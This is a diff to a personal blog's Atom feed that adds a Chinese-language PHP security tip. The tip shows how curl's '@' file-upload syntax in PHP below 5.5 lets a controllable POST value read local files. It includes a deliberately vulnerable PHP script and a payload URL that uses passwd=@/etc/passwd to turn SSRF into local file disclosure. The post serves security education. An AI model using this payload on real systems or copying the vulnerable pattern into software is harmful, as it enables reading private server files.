@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-12-22T20:33:31.190Z</updated>
+  <updated>2019-12-25T08:03:58.756Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,9 +17,32 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>php安全 —— [tips] curl</title>
+    <link href="http://yoursite.com/2019/12/25/php-%E5%B0%8Ftips-curl/"/>
+    <id>http://yoursite.com/2019/12/25/php-小tips-curl/</id>
+    <published>2019-12-25T07:21:00.000Z</published>
+    <updated>2019-12-25T08:03:58.756Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在php5.5以后使用curl上传文件时，必须使用 <code>CURLFile</code>类才行,而5.5以下的写法很简单,只需要在value加上@与文件路径即可上传文件:</p><blockquote><p>php 5.5:</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'pic'</span>=&gt; <span class="keyword">new</span> \CURLFile(<span class="string">'./1.jpg'</span>),</span><br><span class="line">        <span class="string">'submit'</span> =&gt; <span class="string">'submit'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><p>php &lt;5.5</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'pic'</span> =&gt; <span class="string">'@./pic1.jpg'</span>,</span><br><span class="line">    <span class="string">'submit'</span> =&gt; <span class="string">'submit'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="隐患"><a href="#隐患" class="headerlink" title="隐患"></a>隐患</h2><p>假如我们可以控制<code>value</code>,与部分<code>HOST</code>部分，那么可以在<code>php5.5</code>以下把一个SSRF 转化为 LFI:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"http://api."</span>.$_GET[<span class="string">'HOST'</span>].<span class="string">"/api/login"</span>;</span><br><span class="line">$post_data = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"username"</span> =&gt; $_GET[<span class="string">'user'</span>],</span><br><span class="line">    <span class="string">"password"</span> =&gt; $_GET[<span class="string">'passwd'</span>]</span><br><span class="line">);</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch , CURLOPT_URL , $url);</span><br><span class="line">curl_setopt($ch , CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch , CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> $output;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong>:</p><p><code>curl http://127.0.0.1/test.php?HOST=web&amp;user=213&amp;passwd=@/etc/passwd</code></p><p><strong>成功获取到本地文件</strong>:</p><p><img src="/images/15772610011187.jpg" alt><br>∫</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在php5.5以后使用curl上传文件时，必须使用 &lt;code&gt;CURLFile&lt;/code&gt;类才行,而5.5以下的写法很简单,只需要在va
+      
+    
+    </summary>
+    
+    
+      <category term="php安全" scheme="http://yoursite.com/tags/php%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
     <title>php安全 —— [tips] 跨目录复制文件</title>
-    <link href="http://yoursite.com/2019/12/23/php%20%E5%B0%8Ftips/"/>
-    <id>http://yoursite.com/2019/12/23/php 小tips/</id>
+    <link href="http://yoursite.com/2019/12/23/php-%E5%B0%8Ftips-file/"/>
+    <id>http://yoursite.com/2019/12/23/php-小tips-file/</id>
     <published>2019-12-22T17:55:00.000Z</published>
     <updated>2019-12-22T20:33:31.190Z</updated>
     
